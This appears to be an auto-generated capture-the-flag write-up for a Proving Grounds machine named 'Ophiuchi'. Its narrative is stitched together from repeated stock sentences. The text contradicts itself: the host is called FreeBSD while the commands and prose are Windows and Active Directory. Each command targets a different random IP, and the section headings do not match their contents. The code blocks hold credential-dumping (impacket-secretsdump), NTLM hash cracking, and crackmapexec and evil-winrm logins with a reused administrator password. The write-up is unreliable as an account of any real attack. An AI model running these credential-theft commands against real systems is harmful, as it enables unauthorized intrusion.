---
TitleSEO: "OffSec Proving Grounds — Ophiuchi (Insane FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Ophiuchi (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Ophiuchi. Weak Service Permissions and SQL Injection to achieve insane compromise on FreeBSD."
Keywords: "pwntilldawn, ctf, insane, active directory"
URL: "https://zurefx.github.io/writeups/htb-ophiuchi-688.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ophiuchi-688/"
Date: "2026-01-05"
Tags: "PwnTillDawn, CTF, Insane, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-ophiuchi-688"
Permalink: "/writeups/htb-ophiuchi-688.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ophiuchi** is rated **Insane** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.86.56.222`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.27.119.46
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.30.22.60 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.184.245
evil-winrm -i 10.109.250.250 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.65.166.133 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

### SMB Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **Sudo Misconfiguration**.

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.42.54.195/FUZZ
crackmapexec smb 10.26.14.115 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
nmap -sCV -p25,443,110 10.114.119.47 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
crackmapexec smb 10.123.33.78 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```powershell
feroxbuster -h
nmap -sCV -p1433,21,143 10.39.254.80 -oN scan.txt
nmap -sCV -p993,21,464 10.109.76.83 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `wpscan`
- `atexec`
- `netcat`
- `impacket`
- `ffuf`

### Key Takeaways

- Weak Service Permissions
- SQL Injection
- Sudo Misconfiguration
- Resource-Based Constrained Delegation
